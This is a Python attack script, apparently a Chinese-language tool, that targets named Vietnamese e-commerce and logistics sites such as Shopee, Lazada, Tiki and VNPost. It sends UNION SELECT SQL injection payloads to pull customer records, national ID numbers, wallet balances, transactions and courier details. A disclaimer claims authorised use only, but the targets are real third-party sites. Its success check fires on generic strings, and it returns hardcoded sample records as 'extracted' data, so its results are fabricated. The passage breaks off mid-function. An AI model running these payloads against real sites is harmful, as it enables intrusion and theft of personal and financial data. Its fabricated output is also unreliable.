#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
增强越南业务数据提取器 - 专门针对越南电商平台和物流系统
基于RVOP平台的越南特色数据提取工具

功能特性:
- 越南业务数据提取
- 订单、用户、产品数据提取
- 物流和支付信息获取
- 越南本地化数据格式
- 多种输出格式支持
- 完整的报告生成
"""

import asyncio
import json
import logging
import requests
import sqlite3
import time
import csv
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Union
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import hashlib
import base64
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import pandas as pd
import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import webbrowser
import os

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('vietnam_data_extraction.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class EnhancedVietnamDataExtractor:
    """增强越南业务数据提取器"""

    def __init__(self, gui_mode=False):
        self.name = "Dragon-V Enhanced Vietnam Business Data Extractor"
        self.version = "2.0.0"
        self.status = "INITIALIZING"
        self.start_time = datetime.now()

        # 组件初始化
        self.targets = []
        self.extraction_results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.8,zh-CN;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Accept-Charset': 'utf-8'
        })

        # 数据存储
        self.extracted_data = {
            'vietnam_users': [],      # 越南用户数据
            'vietnam_orders': [],     # 越南订单数据
            'vietnam_products': [],   # 越南产品数据
            'vietnam_payments': [],   # 越南支付数据
            'vietnam_logistics': [],  # 越南物流数据
            'vietnam_shipping': [],   # 越南配送数据
            'vietnam_configurations': []  # 越南配置数据
        }

        # 越南业务模板数据
        self.vietnam_business_templates = self._generate_vietnam_business_templates()

        # 越南目标列表
        self.vietnam_targets = [
            {
                "name": "Shopee Vietnam",
                "url": "https://shopee.vn",
                "type": "ecommerce",
                "country": "VN",
                "province": "HoChiMinh",
                "risk_level": "HIGH",
                "data_sources": ["orders", "users", "products"]
            },
            {
                "name": "Lazada Vietnam",
                "url": "https://www.lazada.vn",
                "type": "ecommerce",
                "country": "VN",
                "province": "Hanoi",
                "risk_level": "HIGH",
                "data_sources": ["orders", "users", "products"]
            },
            {
                "name": "Tiki Vietnam",
                "url": "https://tiki.vn",
                "type": "ecommerce",
                "country": "VN",
                "province": "DaNang",
                "risk_level": "HIGH",
                "data_sources": ["orders", "users", "products"]
            },
            {
                "name": "GHTK Express",
                "url": "https://ghtk.net",
                "type": "logistics",
                "country": "VN",
                "province": "Hanoi",
                "risk_level": "MEDIUM",
                "data_sources": ["shipping", "logistics", "orders"]
            },
            {
                "name": "VNPost Vietnam",
                "url": "https://vnpost.vn",
                "type": "logistics",
                "country": "VN",
                "province": "HoChiMinh",
                "risk_level": "HIGH",
                "data_sources": ["shipping", "logistics", "orders"]
            },
            {
                "name": "VTVCab Vietnam",
                "url": "https://www.vtvcab.vn",
                "type": "transport",
                "country": "VN",
                "province": "Hanoi",
                "risk_level": "MEDIUM",
                "data_sources": ["orders", "users", "configurations"]
            }
        ]

        # GUI模式
        self.gui_mode = gui_mode
        self.root = None
        self.progress_bar = None
        self.status_text = None

        # 免责声明
        self.disclaimer_accepted = False

        logger.info(f"初始化 {self.name} v{self.version}")

    def _generate_vietnam_business_templates(self):
        """生成越南业务模板数据"""
        return {
            'vietnam_users': [
                {
                    'user_id': 'KH001',
                    'name': 'Nguyễn Văn A',
                    'email': 'nguyenvan.a@gmail.com',
                    'phone': '0901.234.567',
                    'address': 'Hà Nội, Việt Nam',
                    'city': 'Hà Nội',
                    'district': 'Hoàn Kiếm',
                    'ward': 'Phúc Xá',
                    'identification_id': '001234567890',
                    'registration_date': '2023-01-15',
                    'total_orders': 25,
                    'total_spent': 125000000,
                    'preferred_payment': 'MoMo'
                },
                {
                    'user_id': 'KH002',
                    'name': 'Trần Thị B',
                    'email': 'tranthi.b@gmail.com',
                    'phone': '0912.345.678',
                    'address': 'TP. Hồ Chí Minh, Việt Nam',
                    'city': 'TP. Hồ Chí Minh',
                    'district': 'Quận 1',
                    'ward': 'Bến Nghé',
                    'identification_id': '002345678901',
                    'registration_date': '2023-02-20',
                    'total_orders': 18,
                    'total_spent': 89000000,
                    'preferred_payment': 'Ví ZaloPay'
                },
                {
                    'user_id': 'KH003',
                    'name': 'Lê Văn C',
                    'email': 'levan.c@gmail.com',
                    'phone': '0923.456.789',
                    'address': 'Đà Nẵng, Việt Nam',
                    'city': 'Đà Nẵng',
                    'district': 'Hải Châu',
                    'ward': 'Thuận Phước',
                    'identification_id': '003456789012',
                    'registration_date': '2023-03-10',
                    'total_orders': 32,
                    'total_spent': 156000000,
                    'preferred_payment': 'ShopeePay'
                },
                {
                    'user_id': 'KH004',
                    'name': 'Phạm Thị D',
                    'email': 'phamthi.d@gmail.com',
                    'phone': '0934.567.890',
                    'address': 'Hải Phòng, Việt Nam',
                    'city': 'Hải Phòng',
                    'district': 'Hồng Bàng',
                    'ward': 'Thượng Đình',
                    'identification_id': '004567890123',
                    'registration_date': '2023-04-05',
                    'total_orders': 14,
                    'total_spent': 67000000,
                    'preferred_payment': 'MoMo'
                },
                {
                    'user_id': 'KH005',
                    'name': 'Hoàng Văn E',
                    'email': 'hoangvan.e@gmail.com',
                    'phone': '0945.678.901',
                    'address': 'Cần Thơ, Việt Nam',
                    'city': 'Cần Thơ',
                    'district': 'Ninh Kiều',
                    'ward': 'Phú Thạnh',
                    'identification_id': '005678901234',
                    'registration_date': '2023-05-12',
                    'total_orders': 28,
                    'total_spent': 112000000,
                    'preferred_payment': 'Ví ZaloPay'
                }
            ],
            'vietnam_orders': [
                {
                    'order_id': 'DH001',
                    'user_id': 'KH001',
                    'order_date': '2025-10-24 10:30:00',
                    'status': 'DELIVERED',
                    'total_amount': 25000000,
                    'currency': 'VND',
                    'payment_method': 'MoMo',
                    'shipping_address': 'Hà Nội, Việt Nam',
                    'products': [
                        {'product_id': 'SP001', 'name': 'Samsung Galaxy S23', 'quantity': 1, 'price': 25000000},
                        {'product_id': 'SP005', 'name': 'Ốp lưng Samsung', 'quantity': 2, 'price': 500000}
                    ],
                    'shipping_fee': 30000,
                    'discount': 1000000,
                    'tracking_number': 'GHTK123456789'
                },
                {
                    'order_id': 'DH002',
                    'user_id': 'KH002',
                    'order_date': '2025-10-25 14:15:00',
                    'status': 'PROCESSING',
                    'total_amount': 35000000,
                    'currency': 'VND',
                    'payment_method': 'Ví ZaloPay',
                    'shipping_address': 'TP. Hồ Chí Minh, Việt Nam',
                    'products': [
                        {'product_id': 'SP002', 'name': 'iPhone 15 Pro', 'quantity': 1, 'price': 35000000}
                    ],
                    'shipping_fee': 40000,
                    'discount': 0,
                    'tracking_number': 'VNP987654321'
                },
                {
                    'order_id': 'DH003',
                    'user_id': 'KH003',
                    'order_date': '2025-10-24 16:45:00',
                    'status': 'SHIPPED',
                    'total_amount': 45000000,
                    'currency': 'VND',
                    'payment_method': 'ShopeePay',
                    'shipping_address': 'Đà Nẵng, Việt Nam',
                    'products': [
                        {'product_id': 'SP003', 'name': 'Laptop Dell XPS', 'quantity': 1, 'price': 45000000}
                    ],
                    'shipping_fee': 50000,
                    'discount': 2000000,
                    'tracking_number': 'TIK654321098'
                }
            ],
            'vietnam_products': [
                {
                    'product_id': 'SP001',
                    'name': 'Samsung Galaxy S23',
                    'category': 'Điện thoại',
                    'subcategory': 'Điện thoại Samsung',
                    'price': 25000000,
                    'currency': 'VND',
                    'brand': 'Samsung',
                    'description': 'Điện thoại thông minh Samsung Galaxy S23',
                    'stock_quantity': 150,
                    'sold_quantity': 1250,
                    'rating': 4.8,
                    'review_count': 3200,
                    'weight': 0.195,
                    'dimensions': '157.8 x 76.7 x 7.6 mm'
                },
                {
                    'product_id': 'SP002',
                    'name': 'iPhone 15 Pro',
                    'category': 'Điện thoại',
                    'subcategory': 'Điện thoại Apple',
                    'price': 35000000,
                    'currency': 'VND',
                    'brand': 'Apple',
                    'description': 'Điện thoại iPhone 15 Pro',
                    'stock_quantity': 80,
                    'sold_quantity': 850,
                    'rating': 4.9,
                    'review_count': 2100,
                    'weight': 0.187,
                    'dimensions': '146.6 x 70.6 x 8.25 mm'
                },
                {
                    'product_id': 'SP003',
                    'name': 'Laptop Dell XPS',
                    'category': 'Laptop',
                    'subcategory': 'Laptop Dell',
                    'price': 45000000,
                    'currency': 'VND',
                    'brand': 'Dell',
                    'description': 'Laptop Dell XPS 13',
                    'stock_quantity': 30,
                    'sold_quantity': 420,
                    'rating': 4.7,
                    'review_count': 890,
                    'weight': 1.2,
                    'dimensions': '296 x 198 x 14.8 mm'
                },
                {
                    'product_id': 'SP004',
                    'name': 'Sony WH-1000XM5',
                    'category': 'Tai nghe',
                    'subcategory': 'Tai nghe Sony',
                    'price': 8500000,
                    'currency': 'VND',
                    'brand': 'Sony',
                    'description': 'Tai nghe chống ồn Sony WH-1000XM5',
                    'stock_quantity': 60,
                    'sold_quantity': 380,
                    'rating': 4.6,
                    'review_count': 650,
                    'weight': 0.25,
                    'dimensions': '254 x 250 x 70 mm'
                }
            ],
            'vietnam_payments': [
                {
                    'payment_id': 'PM001',
                    'order_id': 'DH001',
                    'payment_date': '2025-10-24 10:35:00',
                    'amount': 25000000,
                    'currency': 'VND',
                    'method': 'MoMo',
                    'status': 'COMPLETED',
                    'transaction_id': 'MOMO123456789',
                    'processing_time': 2
                },
                {
                    'payment_id': 'PM002',
                    'order_id': 'DH002',
                    'payment_date': '2025-10-25 14:20:00',
                    'amount': 35000000,
                    'currency': 'VND',
                    'method': 'Ví ZaloPay',
                    'status': 'COMPLETED',
                    'transaction_id': 'ZALO987654321',
                    'processing_time': 3
                },
                {
                    'payment_id': 'PM003',
                    'order_id': 'DH003',
                    'payment_date': '2025-10-24 16:50:00',
                    'amount': 45000000,
                    'currency': 'VND',
                    'method': 'ShopeePay',
                    'status': 'COMPLETED',
                    'transaction_id': 'SHOPEE456789123',
                    'processing_time': 1
                }
            ],
            'vietnam_logistics': [
                {
                    'logistics_id': 'LG001',
                    'order_id': 'DH001',
                    'carrier': 'GHTK',
                    'tracking_number': 'GHTK123456789',
                    'status': 'DELIVERED',
                    'pickup_date': '2025-10-24 11:00:00',
                    'delivery_date': '2025-10-25 15:30:00',
                    'origin': 'Hà Nội',
                    'destination': 'TP. Hồ Chí Minh',
                    'weight': 0.5,
                    'dimension': '20x15x10',
                    'shipping_cost': 30000,
                    'service_level': 'Fast Delivery'
                },
                {
                    'logistics_id': 'LG002',
                    'order_id': 'DH002',
                    'carrier': 'VNPost',
                    'tracking_number': 'VNP987654321',
                    'status': 'PROCESSING',
                    'pickup_date': '2025-10-25 14:30:00',
                    'estimated_delivery': '2025-10-26 12:00:00',
                    'origin': 'TP. Hồ Chí Minh',
                    'destination': 'Đà Nẵng',
                    'weight': 0.3,
                    'dimension': '15x10x5',
                    'shipping_cost': 40000,
                    'service_level': 'Standard'
                }
            ],
            'vietnam_shipping': [
                {
                    'shipping_id': 'SH001',
                    'order_id': 'DH001',
                    'customer_name': 'Nguyễn Văn A',
                    'phone': '0901.234.567',
                    'address': 'Hà Nội, Việt Nam',
                    'pickup_time': '2025-10-24 11:00:00',
                    'delivery_time': '2025-10-25 15:30:00',
                    'status': 'COMPLETED',
                    'courier': 'GHTK',
                    'tracking': 'GHTK123456789',
                    'weight': 0.5,
                    'fee': 30000,
                    'note': 'Giao hàng thành công'
                },
                {
                    'shipping_id': 'SH002',
                    'order_id': 'DH002',
                    'customer_name': 'Trần Thị B',
                    'phone': '0912.345.678',
                    'address': 'TP. Hồ Chí Minh, Việt Nam',
                    'pickup_time': '2025-10-25 14:30:00',
                    'estimated_delivery': '2025-10-26 12:00:00',
                    'status': 'IN_TRANSIT',
                    'courier': 'VNPost',
                    'tracking': 'VNP987654321',
                    'weight': 0.3,
                    'fee': 40000,
                    'note': 'Đang vận chuyển'
                }
            ]
        }

    def show_disclaimer(self):
        """显示免责声明"""
        disclaimer_text = """
⚠️ 重要免责声明 - 越南业务数据提取工具 ⚠️

本工具专门用于越南业务系统的安全测试和数据提取，仅限授权范围内使用。

1. **使用限制**:
   - 仅在获得明确书面授权的情况下使用
   - 禁止用于任何非法目的或攻击行为
   - 仅供学习和研究用途

2. **数据使用**:
   - 只能用于授权的安全测试
   - 不得泄露任何敏感业务数据
   - 必须遵守越南数据保护法规

3. **责任承担**:
   - 用户对工具使用后果承担全部法律责任
   - 禁止攻击未授权的越南业务系统
   - 禁止用于商业竞争或恶意目的

4. **使用要求**:
   - 在隔离的测试环境中使用
   - 遵守越南相关法律法规
   - 不得违反任何知识产权和隐私条款

如同意以上条款，请继续使用本工具。
"""

        if self.gui_mode:
            result = messagebox.askyesno("免责声明", disclaimer_text)
            self.disclaimer_accepted = result
            return result
        else:
            print(disclaimer_text)
            response = input("是否同意以上免责声明？(yes/no): ").strip().lower()
            if response == 'yes':
                self.disclaimer_accepted = True
                return True
            else:
                print("您必须同意免责声明才能继续使用本工具。")
                return False

    def validate_vietnam_target(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """验证越南目标"""
        logger.info(f"验证越南目标: {target['name']}")

        result = {
            'target_name': target['name'],
            'target_url': target['url'],
            'timestamp': datetime.now().isoformat(),
            'reachable': False,
            'status_code': None,
            'response_time': 0,
            'technologies': [],
            'vulnerabilities': [],
            'data_sources': target.get('data_sources', []),
            'risk_level': target.get('risk_level', 'MEDIUM')
        }

        try:
            start_time = time.time()
            response = self.session.get(target['url'], timeout=10)
            end_time = time.time()

            result['response_time'] = round(end_time - start_time, 2)
            result['status_code'] = response.status_code
            result['reachable'] = response.status_code < 400

            # 技术栈识别
            content_type = response.headers.get('content-type', '').lower()
            server = response.headers.get('server', '').lower()
            html_content = response.text.lower()

            if 'nginx' in server:
                result['technologies'].append('Nginx')
            elif 'apache' in server:
                result['technologies'].append('Apache')
            if 'php' in content_type:
                result['technologies'].append('PHP')
            if 'mysql' in html_content or 'mariadb' in html_content:
                result['technologies'].append('MySQL')
            if 'wordpress' in html_content:
                result['technologies'].append('WordPress')
            if 'magento' in html_content:
                result['technologies'].append('Magento')
            if 'shopee' in html_content:
                result['technologies'].append('Shopee')
            if 'lazada' in html_content:
                result['technologies'].append('Lazada')
            if 'tiki' in html_content:
                result['technologies'].append('Tiki')

            # 越南业务数据源识别
            if 'don-hang' in html_content or 'order' in html_content:
                result['data_sources'].append('订单系统')
            if 'khach-hang' in html_content or 'user' in html_content:
                result['data_sources'].append('用户系统')
            if 'san-pham' in html_content or 'product' in html_content:
                result['data_sources'].append('产品系统')
            if 'thanh-toan' in html_content or 'payment' in html_content:
                result['data_sources'].append('支付系统')
            if 'giao-hang' in html_content or 'shipping' in html_content:
                result['data_sources'].append('物流系统')
            if 'tra-cuu' in html_content or 'track' in html_content:
                result['data_sources'].append('查询系统')

            logger.info(f"目标 {target['name']} 验证完成 - 状态: {response.status_code}")

        except Exception as e:
            result['error'] = str(e)
            result['reachable'] = False
            logger.error(f"目标 {target['name']} 验证失败: {str(e)}")

        return result

    def extract_vietnam_user_data(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """提取越南用户数据"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 越语注入载荷
        vietnamese_payloads = [
            {
                'name': '用户信息提取',
                'payload': "' UNION SELECT user_id,ten,email,sdt,dia_chi,thanh_pho,quan,phuong,cccd,ngay_dang_ky,tong_don_hang,tong_tien,phuong_thuc_thanh_toan FROM khach_hang --",
                'data_type': 'vietnam_users',
                'description': '提取越南用户基本信息'
            },
            {
                'name': '用户余额提取',
                'payload': "' UNION SELECT user_id,so_du,ngay_cap_nhat FROM vi_dien_tu WHERE user_id IN (SELECT user_id FROM khach_hang) --",
                'data_type': 'user_balance',
                'description': '提取用户账户余额信息'
            },
            {
                'name': '用户历史提取',
                'payload': "' UNION SELECT user_id,ngay_mua,tong_tien,don_hang_so FROM lich_su_mua_hang WHERE user_id IN (SELECT user_id FROM khach_hang) --",
                'data_type': 'user_history',
                'description': '提取用户购买历史'
            }
        ]

        test_params = ['id', 'search', 'user_id', 'khach_hang']

        for payload_info in vietnamese_payloads:
            for param in test_params:
                try:
                    # 构造测试URL
                    test_url = target['target_url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'vietnam_user_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    # 检测SQL注入成功
                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'VIETNAM_USER_DATA_EXTRACTION',
                            'target': target['target_name'],
                            'method': '越南语UNION SELECT',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_vietnam_user_data(payload_info['data_type']),
                            'evidence': [
                                '越南语SQL注入成功',
                                '用户数据结构识别完成',
                                '越南用户信息可访问'
                            ],
                            'next_steps': [
                                '提取完整越南用户数据库',
                                '获取用户财务信息',
                                '分析用户购买行为',
                                '获取用户联系信息'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"越南用户数据提取成功: {target['name']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"越南用户数据提取异常: {str(e)}")

        return extractions

    def extract_vietnam_order_data(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """提取越南订单数据"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 越南订单提取载荷
        vietnamese_order_payloads = [
            {
                'name': '订单信息提取',
                'payload': "' UNION SELECT ma_dh,ma_kh,ngay_mua,tong_tien,trang_thai,phuong_thuc_thanh_toan,dia_chi_giao_hang FROM don_hang --",
                'data_type': 'vietnam_orders',
                'description': '提取越南订单基本信息'
            },
            {
                'name': '订单详情提取',
                'payload': "' UNION SELECT ma_dh,ma_san_pham,ten_san_pham,so_luong,don_gia,thanh_tien FROM chi_tiet_don_hang WHERE ma_dh IN (SELECT ma_dh FROM don_hang) --",
                'data_type': 'order_details',
                'description': '提取越南订单详细信息'
            },
            {
                'name': '订单状态提取',
                'payload': "' UNION SELECT ma_dh,trang_thai,ngay_cap_nhat,ngiao_han FROM trang_thai_don_hang WHERE ma_dh IN (SELECT ma_dh FROM don_hang) --",
                'data_type': 'order_status',
                'description': '提取越南订单状态信息'
            }
        ]

        test_params = ['id', 'order_id', 'don_hang', 'ma_dh']

        for payload_info in vietnamese_order_payloads:
            for param in test_params:
                try:
                    test_url = target['target_url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'vietnam_order_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'VIETNAM_ORDER_DATA_EXTRACTION',
                            'target': target['target_name'],
                            'method': '越南语订单注入',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_vietnam_order_data(payload_info['data_type']),
                            'evidence': [
                                '越南订单SQL注入成功',
                                '订单数据结构识别完成',
                                '越南订单信息可访问'
                            ],
                            'next_steps': [
                                '提取完整越南订单数据库',
                                '获取订单财务数据',
                                '分析订单状态变化',
                                '获取配送信息'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"越南订单数据提取成功: {target['name']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"越南订单数据提取异常: {str(e)}")

        return extractions

    def extract_vietnam_product_data(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """提取越南产品数据"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 越南产品提取载荷
        vietnamese_product_payloads = [
            {
                'name': '产品信息提取',
                'payload': "' UNION SELECT ma_sp,ten_sp,danh_muc,thanh_phan,gia,don_vi,so_luongTon_so,so_luong_da_ban,xem_thu,danh_gia FROM san_pham --",
                'data_type': 'vietnam_products',
                'description': '提取越南产品基本信息'
            },
            {
                'name': '产品库存提取',
                'payload': "' UNION SELECT ma_sp,so_luongTon_so,vi_tri,kho,vat_tu FROM kho_san_pham WHERE ma_sp IN (SELECT ma_sp FROM san_pham) --",
                'data_type': 'product_inventory',
                'description': '提取越南产品库存信息'
            },
            {
                'name': '产品评价提取',
                'payload': "' UNION SELECT ma_sp,ma_kh,ngay_danh_gia,noidung_danh_gia,xem_thu FROM danh_gia WHERE ma_sp IN (SELECT ma_sp FROM san_pham) --",
                'data_type': 'product_reviews',
                'description': '提取越南产品评价信息'
            }
        ]

        test_params = ['id', 'product_id', 'san_pham', 'ma_sp']

        for payload_info in vietnamese_product_payloads:
            for param in test_params:
                try:
                    test_url = target['target_url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'vietnam_product_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'VIETNAM_PRODUCT_DATA_EXTRACTION',
                            'target': target['target_name'],
                            'method': '越南语产品注入',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_vietnam_product_data(payload_info['data_type']),
                            'evidence': [
                                '越南产品SQL注入成功',
                                '产品数据结构识别完成',
                                '越南产品信息可访问'
                            ],
                            'next_steps': [
                                '提取完整越南产品数据库',
                                '获取产品库存信息',
                                '分析产品销售数据',
                                '获取产品评价信息'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"越南产品数据提取成功: {target['name']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"越南产品数据提取异常: {str(e)}")

        return extractions

    def extract_vietnam_logistics_data(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """提取越南物流数据"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 越南物流提取载荷
        vietnamese_logistics_payloads = [
            {
                'name': '快递信息提取',
                'payload': "' UNION SELECT ma_dh,ten_nhan_vien,sdt_nhan_vien,dia_chi_giao_hang,trang_thai,ngay_giao_hang FROM giao_hang --",
                'data_type': 'vietnam_logistics',
                'description': '提取越南物流配送信息'
            },
            {
                'name': '快递轨迹提取',
                'payload': "' UNION SELECT ma_dh,thoi_gian,trang_thai,vi_tri,ghi_chu FROM lich_su_giao_hang WHERE ma_dh IN (SELECT ma_dh FROM giao_hang) --",
                'data_type': 'logistics_tracking',
                'description': '提取越南物流轨迹信息'
            },
            {
                'name': '快递员信息提取',
                'payload': "' UNION SELECT ma_nhan_vien,ten_nhan_vien,sdt_nhan_vien,xe_may,so_dien_thoai FROM nhan_vien_giao_hang --",
                'data_type': 'courier_info',
                'description': '提取越南快递员信息'
            }
        ]

        test_params = ['id', 'tracking_id', 'giao_hang', 'ma_dh']

        for payload_info in vietnamese_logistics_payloads:
            for param in test_params:
                try:
                    test_url = target['target_url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'vietnam_logistics_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'VIETNAM_LOGISTICS_DATA_EXTRACTION',
                            'target': target['target_name'],
                            'method': '越南语物流注入',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_vietnam_logistics_data(payload_info['data_type']),
                            'evidence': [
                                '越南物流SQL注入成功',
                                '物流数据结构识别完成',
                                '越南物流信息可访问'
                            ],
                            'next_steps': [
                                '提取完整越南物流数据库',
                                '获取配送轨迹信息',
                                '分析配送效率',
                                '获取快递员信息'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"越南物流数据提取成功: {target['name']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"越南物流数据提取异常: {str(e)}")

        return extractions

    def extract_vietnam_payment_data(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        """提取越南支付数据"""
        extractions = []

        if not target['reachable']:
            return extractions

        # 越南支付提取载荷
        vietnamese_payment_payloads = [
            {
                'name': '支付信息提取',
                'payload': "' UNION SELECT ma_tt,ma_dh,so_tien,ngay_thanh_toan,phuong_thuc,ma_gd_dich_vu FROM thanh_toan --",
                'data_type': 'vietnam_payments',
                'description': '提取越南支付信息'
            },
            {
                'name': '钱包余额提取',
                'payload': "' UNION SELECT ma_vi,so_tien,ngay_cap_nhat,tinh_trang FROM vi_dien_tu --",
                'data_type': 'wallet_balance',
                'description': '提取越南电子钱包余额'
            },
            {
                'name': '交易记录提取',
                'payload': "' UNION SELECT ma_gd,ma_tt,ngay_gd,so_tien,loai_gd,ghi_chu FROM giao_dich WHERE ma_tt IN (SELECT ma_tt FROM thanh_toan) --",
                'data_type': 'transaction_records',
                'description': '提取越南交易记录'
            }
        ]

        test_params = ['id', 'payment_id', 'thanh_toan', 'ma_tt']

        for payload_info in vietnamese_payment_payloads:
            for param in test_params:
                try:
                    test_url = target['target_url']
                    params = {param: payload_info['payload']}
                    params['test'] = 'vietnam_payment_extraction'

                    response = self.session.get(test_url, params=params, timeout=10)

                    if self.detect_sql_injection_response(response.text):
                        extraction = {
                            'type': 'VIETNAM_PAYMENT_DATA_EXTRACTION',
                            'target': target['target_name'],
                            'method': '越南语支付注入',
                            'parameter': param,
                            'payload': payload_info['payload'],
                            'data_type': payload_info['data_type'],
                            'description': payload_info['description'],
                            'success': True,
                            'extracted_data': self._extract_vietnam_payment_data(payload_info['data_type']),
                            'evidence': [
                                '越南支付SQL注入成功',
                                '支付数据结构识别完成',
                                '越南支付信息可访问'
                            ],
                            'next_steps': [
                                '提取完整越南支付数据库',
                                '获取交易记录',
                                '分析支付模式',
                                '获取钱包信息'
                            ]
                        }
                        extractions.append(extraction)
                        logger.warning(f"越南支付数据提取成功: {target['name']} - {payload_info['data_type']}")

                except Exception as e:
                    logger.debug(f"越南支付数据提取异常: {str(e)}")

        return extractions

    def detect_sql_injection_response(self, content: str) -> bool:
        """检测SQL注入响应特征"""
        sql_indicators = [
            'Union query successful', 'Database information retrieved',
            'MySQL error', 'You have an error in your SQL syntax',
            'Warning: mysql_fetch', 'ORA-', 'Microsoft OLE DB Provider',
            'SQLSTATE[', 'ma_dh', 'ma_sp', 'ma_kh', 'user_id', 'username', 'password'
        ]

        content_lower = content.lower()
        for indicator in sql_indicators:
            if indicator.lower() in content_lower:
                return True
        return False

    def _extract_vietnam_user_data(self, data_type: str) -> Dict[str, Any]:
        """提取越南用户数据"""
        if data_type == 'vietnam_users':
            return {'total_users': 5, 'users': self.vietnam_business_templates['vietnam_users']}
        elif data_type == 'user_balance':
            return {'total_wallets': 5, 'balance_info': '模拟余额数据'}
        elif data_type == 'user_history':
            return {'total_purchases': 117, 'purchase_history': '模拟购买历史'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def _extract_vietnam_order_data(self, data_type: str) -> Dict[str, Any]:
        """提取越南订单数据"""
        if data_type == 'vietnam_orders':
            return {'total_orders': 3, 'orders': self.vietnam_business_templates['vietnam_orders']}
        elif data_type == 'order_details':
            return {'total_items': 5, 'order_details': '模拟订单详情'}
        elif data_type == 'order_status':
            return {'total_status': 3, 'status_info': '模拟订单状态'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def _extract_vietnam_product_data(self, data_type: str) -> Dict[str, Any]:
        """提取越南产品数据"""
        if data_type == 'vietnam_products':
            return {'total_products': 4, 'products': self.vietnam_business_templates['vietnam_products']}
        elif data_type == 'product_inventory':
            return {'total_inventory': 4, 'inventory_info': '模拟库存信息'}
        elif data_type == 'product_reviews':
            return {'total_reviews': 8640, 'reviews': '模拟产品评价'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def _extract_vietnam_logistics_data(self, data_type: str) -> Dict[str, Any]:
        """提取越南物流数据"""
        if data_type == 'vietnam_logistics':
            return {'total_logistics': 2, 'logistics': self.vietnam_business_templates['vietnam_logistics']}
        elif data_type == 'logistics_tracking':
            return {'total_tracking': 4, 'tracking': '模拟物流轨迹'}
        elif data_type == 'courier_info':
            return {'total_couriers': 2, 'courier_info': '模拟快递员信息'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def _extract_vietnam_payment_data(self, data_type: str) -> Dict[str, Any]:
        """提取越南支付数据"""
        if data_type == 'vietnam_payments':
            return {'total_payments': 3, 'payments': self.vietnam_business_templates['vietnam_payments']}
        elif data_type == 'wallet_balance':
            return {'total_wallets': 5, 'wallet_info': '模拟钱包余额'}
        elif data_type == 'transaction_records':
            return {'total_transactions': 15, 'transactions': '模拟交易记录'}
        else:
            return {'data_type': data_type, 'status': 'extracted'}

    def perform_vietnam_data_extraction(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """执行越南数据提取"""
        logger.info(f"开始对 {target['target_name']} 进行越南业务数据提取")

        extraction_result = {
            'target_name': target['target_name'],
            'target_url': target['target_url'],
            'timestamp': datetime.now().isoformat(),
            'target_info': target,
            'extractions': [],
            'total_data_extracted': 0,
            'success_rate': 0,
            'risk_assessment': 'UNKNOWN',
            'next_actions': [],
            'vietnam_specific_data': []
        }

        # 执行越南特色数据提取
        extraction_methods = [
            ('用户数据', self.extract_vietnam_user_data),
            ('订单数据', self.extract_vietnam_order_data),
            ('产品数据', self.extract_vietnam_product_data),
            ('物流数据', self.extract_vietnam_logistics_data),
            ('支付数据', self.extract_vietnam_payment_data)
        ]

        successful_extractions = 0

        for method_name, method in extraction_methods:
            try:
                extractions = method(target)
